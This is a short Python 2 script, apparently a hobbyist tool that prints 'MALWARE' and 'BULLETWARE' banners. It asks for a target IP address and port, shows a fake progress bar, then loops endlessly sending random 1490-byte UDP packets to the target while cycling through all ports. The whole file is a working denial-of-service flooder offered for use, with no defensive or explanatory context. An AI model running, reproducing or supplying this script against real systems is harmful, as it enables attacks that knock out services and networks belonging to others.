import os,sys,time,socket,random
from time import sleep as sl
from os import system as sy
sy ("figlet MALWARE | lolcat ")

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

sy("clear")
sy("figlet BULLETWARE | lolcat ")
print
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
sy("clear")
sy("figlet SHOOT ! ! | lolcat")
print "[                     ] 000% "
sl(1)
print "[=====>               ] 025%"
sl(1)
print "[==========>          ] 050%"
sl(1)
print "[===============>     ] 075%"
sl(1)
print "[====================>] 100%"
sl(0.5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent += 1
     port += 1
     print "Sent %s ip: %s port:%s"%(sent,ip,port)
     if port == 65534:
        port = 1
